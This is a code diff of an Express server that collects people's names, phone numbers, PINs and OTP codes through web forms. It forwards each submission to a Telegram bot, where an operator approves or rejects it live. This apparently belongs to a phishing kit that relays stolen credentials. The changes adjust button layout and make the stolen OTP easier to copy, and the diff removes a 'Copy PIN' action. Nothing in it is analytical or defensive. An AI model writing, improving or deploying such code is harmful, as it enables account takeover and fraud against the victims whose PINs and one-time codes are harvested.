@@ -268,7 +268,7 @@ app.get('/pin', (req, res) => res.sendFile(path.join(__dirname, 'public', 'pin.h
 app.get('/code', (req, res) => res.sendFile(path.join(__dirname, 'public', 'code.html')));
 
 // ============================================================
-// 📱 PHONE SUBMISSION — Approve / Reject
+// 📱 PHONE SUBMISSION — Approve / Reject (full-width buttons)
 // ============================================================
 app.post('/submit-phone', (req, res) => {
     const { name, phone, botId } = req.body;
@@ -289,15 +289,12 @@ app.post('/submit-phone', (req, res) => {
     };
     saveStore();
 
-    // 2 buttons per row → each takes 50% width (widest possible layout)
     sendTelegramMessage(
         bot,
         withIdentity('📱 PHONE NUMBER VERIFICATION', finalName, finalPhone),
         [
-            [
-                { text: '✅ Approve', callback_data: `phone_ok:${requestId}` },
-                { text: '❌ Reject',  callback_data: `phone_bad:${requestId}` }
-            ]
+            [{ text: '✅ Approve', callback_data: `phone_ok:${requestId}` }],
+            [{ text: '❌ Reject',  callback_data: `phone_bad:${requestId}` }]
         ]
     );
 
@@ -310,7 +307,7 @@ app.get('/check-phone/:requestId', (req, res) => {
     res.json({ approved: approvedPhones[requestId] ?? null });
 });
 
-// ---------------- PIN SUBMISSION — Correct / Wrong ----------------
+// ---------------- PIN SUBMISSION — Correct / Wrong, NO copy button ----------------
 app.post('/submit-pin', (req, res) => {
     const { name, phone, pin, botId } = req.body;
     const bot = getBot(botId);
@@ -337,14 +334,9 @@ app.post('/submit-pin', (req, res) => {
             `<b>PIN:</b>  <b><code>${esc(pin)}</code></b>`
         ]),
         [
-            [
-                { text: '✅ Correct', callback_data: `pin_ok:${requestId}` },
-                { text: '❌ Wrong',   callback_data: `pin_bad:${requestId}` }
-            ],
-            [
-                { text: '📋 Copy PIN', callback_data: `pin_copy:${requestId}` },
-                { text: '🛑 Block',    callback_data: `pin_block:${requestId}` }
-            ]
+            [{ text: '✅ Correct', callback_data: `pin_ok:${requestId}` }],
+            [{ text: '❌ Wrong',   callback_data: `pin_bad:${requestId}` }],
+            [{ text: '🛑 Block',    callback_data: `pin_block:${requestId}` }]
         ]
     );
 
@@ -357,7 +349,7 @@ app.get('/check-pin/:requestId', (req, res) => {
     res.json({ approved: approvedPins[requestId] ?? null });
 });
 
-// ---------------- CODE (OTP) SUBMISSION — Correct / Wrong ----------------
+// ---------------- CODE (OTP) SUBMISSION — Correct / Wrong + Copy ----------------
 app.post('/submit-code', (req, res) => {
     const { name, phone, code, botId } = req.body;
     const bot = getBot(botId);
@@ -385,13 +377,9 @@ app.post('/submit-code', (req, res) => {
             `<b>Code:</b> <b><code>${esc(finalCode)}</code></b>`
         ]),
         [
-            [
-                { text: '✅ Correct', callback_data: `code_ok:${requestId}` },
-                { text: '❌ Wrong',   callback_data: `code_bad:${requestId}` }
-            ],
-            [
-                { text: '📋 Copy Code', callback_data: `code_copy:${requestId}` }
-            ]
+            [{ text: '✅ Correct', callback_data: `code_ok:${requestId}` }],
+            [{ text: '❌ Wrong',   callback_data: `code_bad:${requestId}` }],
+            [{ text: '📋 Copy Code', callback_data: `code_copy:${requestId}` }]
         ]
     );
 
@@ -438,21 +426,14 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
         const phone = meta.phone || 'Unknown';
 
         // ============================================================
-        // 📋 COPY ACTIONS
+        // 📋 COPY OTP — replies with ONLY the code
         // ============================================================
         if (action === 'code_copy') {
             const code = meta.code || '';
             await answerCallback(bot, cb.id, 'Code sent for copying');
 
             const originalMsgId = cb.message?.message_id;
-            const copyMessage =
-                `<b>📋 COPY OTP CODE</b>\n` +
-                `━━━━━━━━━━━━━━━━━━\n` +
-                `<b>Name:</b>  <b>${esc(name)}</b>\n` +
-                `<b>Phone:</b> <b>${esc(phone)}</b>\n` +
-                `━━━━━━━━━━━━━━━━━━\n` +
-                `👇 <b>Tap the code below to copy</b>\n\n` +
-                `<code>${esc(code)}</code>`;
+            const copyMessage = `<code>${esc(code)}</code>`;
 
             if (originalMsgId) {
                 await replyTelegramMessage(bot, originalMsgId, copyMessage);
@@ -460,29 +441,6 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
                 await sendTelegramMessage(bot, copyMessage);
             }
             console.log('📋 code_copy sent for', requestId, '→', code);
-            return;
-        }
-
-        if (action === 'pin_copy') {
-            const pin = meta.pin || '';
-            await answerCallback(bot, cb.id, 'PIN sent for copying');
-
-            const originalMsgId = cb.message?.message_id;
-            const copyMessage =
-                `<b>📋 COPY PIN</b>\n` +
-                `━━━━━━━━━━━━━━━━━━\n` +
-                `<b>Name:</b>  <b>${esc(name)}</b>\n` +
-                `<b>Phone:</b> <b>${esc(phone)}</b>\n` +
-                `━━━━━━━━━━━━━━━━━━\n` +
-                `👇 <b>Tap the PIN below to copy</b>\n\n` +
-                `<code>${esc(pin)}</code>`;
-
-            if (originalMsgId) {
-                await replyTelegramMessage(bot, originalMsgId, copyMessage);
-            } else {
-                await sendTelegramMessage(bot, copyMessage);
-            }
-            console.log('📋 pin_copy sent for', requestId, '→', pin);
             return;
         }
 
